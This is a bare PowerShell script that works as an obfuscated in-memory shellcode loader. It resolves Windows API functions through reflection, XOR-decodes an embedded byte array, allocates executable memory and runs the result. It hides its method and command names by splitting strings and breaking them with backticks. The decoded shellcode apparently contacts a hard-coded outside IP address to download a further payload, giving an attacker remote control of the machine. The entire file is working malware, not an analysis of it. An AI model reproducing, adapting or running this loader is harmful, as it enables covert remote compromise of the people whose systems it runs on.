Set-StrictMode -Version 2

$DoIt = @'
function func_b {
	Param ($amodule, $aprocedure)		
	$aunsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.Uns'+'afeN'+'ativeMethods')
	$agpa = $aunsafe_native_methods.GetMethod('GetP'+'rocAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $agpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($aunsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($amodule)))), $aprocedure))
}

function func_a {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $aparameters,
		[Parameter(Position = 1)] [Type] $areturn_type = [Void]
	)

	$atype_b = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('Reflect'+'edDel'+'egate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDeleg'+'ateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$atype_b.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $aparameters).SetImplementationFlags('Runtime, Managed')
	$atype_b.DefineMethod('Inv'+'oke', 'Public, HideBySig, NewSlot, Virtual', $areturn_type, $aparameters).SetImplementationFlags('Runtime, Managed')

	return $atype_b.CreateType()
}

[Byte[]]$acode =  [Byte[]](223,203,170,35,35,35,67,170,198,18,241,71,168,113,19,168,113,47,168,113,55,168,81,11,44,148,105,5,18,220,18,227,143,31,66,95,33,15,3,226,236,46,34,228,193,211,113,116,168,113,51,168,97,31,34,243,168,99,91,166,227,87,105,34,243,115,168,107,59,168,123,3,34,240,192,31,106,168,23,168,34,245,18,220,18,227,143,226,236,46,34,228,27,195,86,215,32,94,219,24,94,7,86,193,123,168,123,7,34,240,69,168,47,104,168,123,63,34,240,168,39,168,34,243,170,103,7,7,120,120,66,122,121,114,220,195,123,124,121,168,49,200,165,126,75,77,70,87,35,75,84,74,77,74,119,75,111,84,5,36,220,246,18,220,116,116,116,116,116,75,25,117,90,132,220,246,202,167,35,35,35,120,18,234,114,114,73,32,114,114,75,18,86,35,35,112,115,75,116,170,188,229,220,246,200,83,120,18,241,113,75,35,33,99,167,113,113,113,112,113,115,75,200,118,13,24,220,246,170,229,160,224,115,18,220,116,116,73,220,112,117,75,14,37,59,88,220,246,166,227,44,167,224,34,35,35,18,220,166,213,87,39,170,218,200,42,75,137,230,193,126,220,246,170,226,75,102,2,125,18,220,246,18,220,116,73,36,114,117,115,75,148,116,195,40,220,246,156,35,12,35,35,26,228,87,148,18,220,202,178,34,35,35,202,234,34,35,35,203,168,220,220,220,12,20,81,103,76,35,122,80,146,196,81,170,17,155,138,212,12,159,22,4,224,118,189,170,69,97,57,37,205,22,58,108,190,155,185,226,110,35,32,144,110,105,108,168,144,207,11,125,209,237,179,223,85,14,77,152,67,154,239,165,101,222,236,71,55,10,139,228,90,89,75,120,56,71,56,102,88,40,52,35,118,80,70,81,14,98,68,70,77,87,25,3,110,76,89,74,79,79,66,12,22,13,19,3,11,64,76,78,83,66,87,74,65,79,70,24,3,110,112,106,102,3,26,13,19,24,3,116,74,77,71,76,84,80,3,109,119,3,21,13,18,24,3,116,108,116,21,23,24,3,119,81,74,71,70,77,87,12,22,13,19,24,3,109,115,19,17,10,46,41,35,195,133,164,180,37,255,2,164,147,26,242,192,102,133,100,138,51,140,2,179,166,14,119,255,49,110,17,245,37,86,88,86,58,216,21,15,178,141,11,4,102,196,26,96,76,121,9,106,87,242,126,2,97,255,41,27,113,212,114,62,248,47,218,183,163,131,46,161,85,126,229,90,102,58,70,55,52,57,34,71,20,6,221,154,207,189,92,34,81,115,225,47,1,77,118,215,6,221,129,103,57,92,124,154,209,248,52,147,32,60,74,39,36,131,193,33,102,148,145,180,139,120,170,53,210,192,54,187,58,221,166,219,54,11,187,52,173,83,56,233,170,246,28,212,116,141,177,137,219,178,190,199,69,35,217,172,80,58,196,14,247,178,113,177,158,165,152,45,228,233,153,121,219,110,104,22,144,163,48,136,165,219,122,199,249,249,251,182,103,146,222,194,152,245,34,65,151,117,81,20,54,98,226,170,247,42,188,157,155,174,165,92,35,75,211,150,129,117,220,246,73,99,75,35,51,35,35,75,35,35,99,35,116,75,123,135,112,198,220,246,176,154,35,35,35,35,34,250,114,112,170,196,116,75,35,3,35,35,112,117,75,49,181,170,193,220,246,166,227,87,229,168,36,34,224,166,227,86,198,123,224,203,138,222,220,220,23,20,13,18,19,21,13,17,18,20,13,18,19,16,35,49,23,117,91)

for ($gg = 0; $gg -lt $acode.Count; $gg++) {
	$acode[$gg] = $acode[$gg] -bxor 35
}

$ava = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_b kernel32.dll VirtualAlloc), (func_a @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$abuffer = $ava.Invoke([IntPtr]::Zero, $acode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($acode, 0, $abuffer, $acode.length)

$arunme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($abuffer, (func_a @([IntPtr]) ([Void])))
$arunme.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) ie`x $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
	i`ex $DoIt
}
